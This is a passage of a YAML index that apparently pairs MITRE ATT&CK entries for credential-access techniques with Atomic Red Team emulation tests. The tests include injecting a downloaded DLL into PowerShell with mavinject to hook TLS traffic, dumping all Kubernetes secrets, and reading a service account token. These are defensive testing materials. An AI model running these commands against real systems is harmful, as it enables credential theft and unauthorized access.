        Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)\n"
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - Network
      - Azure AD
      - Google Workspace
      - IaaS
      - Office 365
      - SaaS
      x_mitre_version: '2.3'
      x_mitre_data_sources:
      - 'Module: Module Load'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Application Log: Application Log Content'
      - 'File: File Modification'
      - 'Active Directory: Active Directory Object Modification'
      - 'User Account: User Account Authentication'
      - 'File: File Creation'
      - 'User Account: User Account Modification'
      - 'Windows Registry: Windows Registry Key Creation'
      - 'Logon Session: Logon Session Creation'
      - 'Process: Process Access'
      - 'Process: OS API Execution'
      type: attack-pattern
      id: attack-pattern--f4c1826f-a322-41cd-9557-562100848c84
      created: '2020-02-11T19:01:56.887Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1556
        external_id: T1556
      - source_name: Clymb3r Function Hook Passwords Sept 2013
        description: Bialek, J. (2013, September 15). Intercepting Password Changes
          With Function Hooking. Retrieved November 21, 2017.
        url: https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
      - source_name: Xorrior Authorization Plugins
        description: Chris Ross. (2018, October 17). Persistent Credential Theft with
          Authorization Plugins. Retrieved April 22, 2021.
        url: https://xorrior.com/persistent-credential-theft/
      - source_name: Dell Skeleton
        description: Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis.
          Retrieved April 8, 2019.
        url: https://www.secureworks.com/research/skeleton-key-malware-analysis
      - source_name: dump_pwd_dcsync
        description: Metcalf, S. (2015, November 22). Dump Clear-Text Passwords for
          All Admins in the Domain Using Mimikatz DCSync. Retrieved November 15, 2021.
        url: https://adsecurity.org/?p=2053
      - source_name: TechNet Audit Policy
        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
          June 3, 2016.
        url: https://technet.microsoft.com/en-us/library/dn487457.aspx
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1056.004:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6
      type: attack-pattern
      created: '2020-02-11T19:01:15.930Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1056.004
        url: https://attack.mitre.org/techniques/T1056/004
      - source_name: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017
        description: Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I.
          Retrieved December 18, 2017.
        url: https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918
      - url: https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx
        description: Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.
        source_name: Microsoft Hook Overview
      - url: https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
        description: 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques:
          A Technical Survey Of Common And Trending Process Injection Techniques.
          Retrieved December 7, 2017.'
        source_name: Elastic Process Injection July 2017
      - url: https://www.adlice.com/userland-rootkits-part-1-iat-hooks/
        description: 'Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks.
          Retrieved December 12, 2017.'
        source_name: Adlice Software IAT Hooks Oct 2014
      - url: https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/
        description: 'Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User
          Mode. Retrieved December 20, 2017.'
        source_name: MWRInfoSecurity Dynamic Hooking 2015
      - url: https://www.exploit-db.com/docs/17802.pdf
        description: Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved
          December 12, 2017.
        source_name: HighTech Bridge Inline Hooking Sept 2011
      - url: https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html
        description: Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware
          Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.
        source_name: Volatility Detecting Hooks Sept 2012
      - url: https://github.com/prekageo/winhook
        description: Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.
        source_name: PreKageo Winhook Jul 2011
      - url: https://github.com/jay/gethooks
        description: Satiro, J. (2011, September 14). GetHooks. Retrieved December
          12, 2017.
        source_name: Jay GetHooks Sept 2011
      - url: https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/
        description: Felici, M. (2006, December 6). Any application-defined hook procedure
          on my machine?. Retrieved December 12, 2017.
        source_name: Zairon Hooking Dec 2006
      - url: https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/
        description: 'Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense
          against user-land. Retrieved December 12, 2017.'
        source_name: EyeofRa Detecting Hooking June 2017
      - url: http://www.gmer.net/
        description: GMER. (n.d.). GMER. Retrieved December 12, 2017.
        source_name: GMER Rootkits
      - url: https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx
        description: Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved
          December 12, 2017.
        source_name: Microsoft Process Snapshot
      - url: https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis
        description: Stack Exchange - Security. (2012, July 31). What are the methods
          to find hooked functions and APIs?. Retrieved December 12, 2017.
        source_name: StackExchange Hooks Jul 2012
      modified: '2020-11-10T18:29:31.138Z'
      name: 'Input Capture: Credential API Hooking'
      description: |
        Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:

        * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
        * **Import address table (IAT) hooking**, which use modifications to a process‚Äôs IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
        * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Process: Process Metadata'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      identifier: T1056.004
    atomic_tests:
    - name: Hook PowerShell TLS Encrypt/Decrypt Messages
      auto_generated_guid: de1934ea-1fbf-425b-8795-65fb27dd7e33
      description: 'Hooks functions in PowerShell to read TLS Communications

        '
      supported_platforms:
      - windows
      input_arguments:
        file_name:
          description: Dll To Inject
          type: path
          default: PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll
        server_name:
          description: TLS Server To Test Get Request
          type: url
          default: https://www.example.com
      dependency_executor_name: powershell
      dependencies:
      - description: 'T1056.004x64.dll must exist on disk at specified location (#{file_name})

          '
        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
      executor:
        command: |
          mavinject $pid /INJECTRUNNING #{file_name}
          Invoke-WebRequest #{server_name} -UseBasicParsing
        name: powershell
        elevation_required: true
  T1552.007:
    technique:
      modified: '2023-04-15T16:11:25.409Z'
      name: Kubernetes List Secrets
      description: "Adversaries may gather credentials via APIs within a containers
        environment. APIs in these environments, such as the Docker API and Kubernetes
        APIs, allow a user to remotely manage their container resources and cluster
        components.(Citation: Docker API)(Citation: Kubernetes API)\n\nAn adversary
        may access the Docker API to collect logs that contain credentials to cloud,
        container, and various other resources in the environment.(Citation: Unit
        42 Unsecured Docker Daemons) An adversary with sufficient permissions, such
        as via a pod's service account, may also use the Kubernetes API to retrieve
        credentials from the Kubernetes API server. These credentials may include
        those needed for Docker API authentication or secrets from Kubernetes cluster
        components. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Center for Threat-Informed Defense (CTID)
      - Jay Chen, Palo Alto Networks
      - Yossi Weizman, Azure Defender Research Team
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.

        It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Containers
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'User Account: User Account Authentication'
      type: attack-pattern
      id: attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436
      created: '2021-03-31T14:01:52.321Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1552/007
        external_id: T1552.007
      - source_name: Unit 42 Unsecured Docker Daemons
        description: Chen, J.. (2020, January 29). Attacker's Tactics and Techniques
          in Unsecured Docker Daemons Revealed. Retrieved March 31, 2021.
        url: https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/
      - source_name: Docker API
        description: Docker. (n.d.). Docker Engine API v1.41 Reference. Retrieved
          March 31, 2021.
        url: https://docs.docker.com/engine/api/v1.41/
      - source_name: Kubernetes API
        description: The Kubernetes Authors. (n.d.). The Kubernetes API. Retrieved
          March 29, 2021.
        url: https://kubernetes.io/docs/concepts/overview/kubernetes-api/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1552.007
    atomic_tests:
    - name: List All Secrets
      auto_generated_guid: 31e794c4-48fd-4a76-aca4-6587c155bc11
      description: |
        A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.
        [More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).

        This test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.
      supported_platforms:
      - containers
      dependencies:
      - description: 'kubectl must be installed

          '
        prereq_command: 'which kubectl

          '
        get_prereq_command: 'echo "kubectl not installed, please install kubectl (https://kubernetes.io/docs/tasks/tools/)"

          '
      executor:
        command: 'kubectl get secrets --all-namespaces

          '
        name: bash
        elevation_required: false
    - name: ListSecrets
      auto_generated_guid: 43c3a49d-d15c-45e6-b303-f6e177e44a9a
      description: 'A Kubernetes secret is an object that lets users store and manage
        sensitive information, such as passwords and connection strings in the cluster.
        Secrets can be consumed by reference in the pod configuration. Attackers who
        have permissions to retrieve the secrets from the API server (by using the
        pod service account, for example) can access sensitive information that might
        include credentials to various services.

        '
      supported_platforms:
      - containers
      input_arguments:
        namespace:
          description: K8s namespace to list
          type: string
          default: default
      dependencies:
      - description: 'kubectl must be installed

          '
        get_prereq_command: 'echo "kubectl must be installed manually"

          '
        prereq_command: 'which kubectl

          '
      executor:
        command: 'kubectl get secrets -n #{namespace}

          '
        name: bash
        elevation_required: false
    - name: Cat the contents of a Kubernetes service account token file
      auto_generated_guid: 788e0019-a483-45da-bcfe-96353d46820f
      description: 'Access the Kubernetes service account access token stored within
        a container in a cluster.

        '
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: Verify docker is installed.
        prereq_command: 'which docker

          '
        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
          echo "Docker installed"; fi

          '
      - description: Verify docker service is running.
        prereq_command: 'sudo systemctl status docker

          '
        get_prereq_command: 'sudo systemctl start docker

          '
      - description: Verify kind is in the path.
        prereq_command: 'which kind

          '
        get_prereq_command: |
          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
          chmod +x ./kind
          mv kind /usr/bin/kind
      - description: Verify kind-atomic-cluster is created
        prereq_command: 'sudo kind get clusters

          '
        get_prereq_command: 'sudo kind create cluster --name atomic-cluster

          '
      - description: Verify kubectl is in path
        prereq_command: 'which kubectl

          '
        get_prereq_command: |
          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
          chmod +x ./kubectl
          mv kubectl /usr/bin/kubectl
      - description: Verify atomic-pod is running.
        prereq_command: 'kubectl --context kind-atomic-cluster get pods |grep atomic-pod

          '
        get_prereq_command: 'kubectl --context kind-atomic-cluster run atomic-pod
          --image=alpine --command -- sleep infinity

          '
      executor:
        command: 'kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token

          '
        name: sh
        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-pod

          '
  T1556.004:
    technique:
      x_mitre_platforms:
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd
      type: attack-pattern
      created: '2020-10-19T17:58:04.155Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1556.004
        url: https://attack.mitre.org/techniques/T1556/004
      - source_name: Mandiant - Synful Knock
        url: https://www.mandiant.com/resources/synful-knock-acis
        description: Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful
          Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.
      - source_name: Cisco IOS Software Integrity Assurance - Image File Verification
        url: https://tools.cisco.com/security/center/resources/integrity_assurance.html#7
        description: Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco
          IOS Image File Verification. Retrieved October 19, 2020.
      - source_name: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification
        url: https://tools.cisco.com/security/center/resources/integrity_assurance.html#13
        description: Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco
          IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.
      modified: '2021-12-14T23:14:26.107Z'
      name: Network Device Authentication
      description: |-
        Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.

        [Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: |-
        Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)

        Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601).
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Modification'
      x_mitre_permissions_required:
      - Administrator
    atomic_tests: []
